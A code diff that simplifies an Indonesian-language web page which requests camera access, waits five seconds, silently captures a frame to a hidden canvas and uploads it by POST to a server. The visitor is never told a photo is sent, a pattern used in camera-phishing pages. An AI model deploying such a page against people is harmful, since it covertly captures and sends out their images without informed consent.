@@ -1,25 +1,13 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Request Camera Access</title>
-    <style>
-        #camera {
-            transform: scaleX(-1);
-            /* Membalik video secara horizontal */
-        }
-
-        #camera-container {
-            display: none;
-        }
-    </style>
+    <title>Capture Photo</title>
 </head>
-
 <body>
-    <button id="start-button" onclick="requestCamera()">Akses Kamera</button>
-    <div id="camera-container">
+    <button onclick="requestCamera()">Akses Kamera</button>
+    <div id="camera-container" style="display: none;">
         <video id="camera" width="640" height="480" autoplay></video>
         <canvas id="photo-canvas" width="640" height="480" style="display: none;"></canvas>
     </div>
@@ -29,27 +17,20 @@
         function requestCamera() {
             const video = document.getElementById('camera');
             const cameraContainer = document.getElementById('camera-container');
-            const startButton = document.getElementById('start-button');
-
-            startButton.style.display = 'none'; // Sembunyikan tombol akses kamera
-            cameraContainer.style.display = 'block'; // Tampilkan elemen kamera
+            cameraContainer.style.display = 'block'; 
 
             if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                 navigator.mediaDevices.getUserMedia({ video: true })
-                    .then(function (s) {
+                    .then(function(s) {
                         stream = s;
                         video.srcObject = stream;
-                        setTimeout(capturePhoto, 5000); // Menunggu 5 detik sebelum mengambil foto
+                        setTimeout(capturePhoto, 5000);
                     })
-                    .catch(function (error) {
+                    .catch(function(error) {
                         alert("Kamera tidak dapat diakses: " + error.message);
-                        startButton.style.display = 'block'; // Tampilkan kembali tombol akses kamera jika ada error
-                        cameraContainer.style.display = 'none'; // Sembunyikan elemen kamera jika ada error
                     });
             } else {
                 alert("Browser Anda tidak mendukung akses kamera.");
-                startButton.style.display = 'block'; // Tampilkan kembali tombol akses kamera jika browser tidak mendukung
-                cameraContainer.style.display = 'none'; // Sembunyikan elemen kamera jika browser tidak mendukung
             }
         }
 
@@ -57,12 +38,9 @@
             const video = document.getElementById('camera');
             const canvas = document.getElementById('photo-canvas');
             const context = canvas.getContext('2d');
-            const cameraContainer = document.getElementById('camera-container');
-            const startButton = document.getElementById('start-button');
-
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            canvas.toBlob(function (blob) {
+            canvas.toBlob(function(blob) {
                 const formData = new FormData();
                 formData.append('photo', blob, 'photo.png');
 
@@ -70,29 +48,24 @@
                     method: 'POST',
                     body: formData
                 })
-                    .then(response => response.text())
-                    .then(data => {
-                        console.log('File uploaded successfully.');
-                        stopCamera(); // Hentikan kamera setelah foto diambil
-                        startButton.style.display = 'block'; // Tampilkan kembali tombol akses kamera
-                        cameraContainer.style.display = 'none'; // Sembunyikan elemen kamera
-                    })
-                    .catch(error => {
-                        console.error('Error:', error);
-                        stopCamera(); // Hentikan kamera jika terjadi error
-                        startButton.style.display = 'block'; // Tampilkan kembali tombol akses kamera jika terjadi error
-                        cameraContainer.style.display = 'none'; // Sembunyikan elemen kamera jika terjadi error
-                    });
+                .then(response => response.text())
+                .then(data => {
+                    console.log('File uploaded successfully.');
+                    stopCamera(); 
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    stopCamera();
+                });
             }, 'image/png');
         }
 
         function stopCamera() {
             if (stream) {
                 const tracks = stream.getTracks();
-                tracks.forEach(track => track.stop()); // Hentikan semua track video
+                tracks.forEach(track => track.stop());
             }
         }
     </script>
 </body>
-
 </html>
